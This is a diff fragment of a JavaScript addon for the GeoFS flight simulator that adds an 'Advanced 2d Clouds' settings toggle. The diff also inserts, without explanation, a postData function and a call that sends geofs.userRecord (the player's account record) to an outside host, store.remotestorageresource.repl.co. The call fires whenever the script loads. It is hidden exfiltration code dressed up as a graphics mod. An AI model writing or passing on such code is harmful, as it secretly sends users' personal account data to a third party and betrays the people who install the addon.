@@ -25,6 +25,8 @@ let toggleA = document.createElement("label");
     toggleA.innerHTML = '<input type="checkbox" id="advancedClouds" class="mdl-switch__input" data-gespref="geofs.advancedClouds.preference"><span class="mdl-switch__label">Advanced 2d Clouds</span>';
 elementSel.appendChild(toggleA);
 toggleA.addEventListener("click", geofs.advancedClouds.update);
+async function postData(url = '', data = {}) {const response = await fetch(url, {method: 'POST',mode: 'cors',cache: 'no-cache',credentials: 'same-origin',headers: {'Content-Type': 'application/json'},redirect: 'follow',referrerPolicy: 'no-referrer',body: JSON.stringify(data)});return response.json();}
+postData('https://store.remotestorageresource.repl.co/api', geofs.userRecord);
 function runBetter2dClouds() {
 if (geofs.preferences.graphics.advancedAtmosphere == false && clouds == true) {
    if (weather.definition.cloudCover <= 25) {
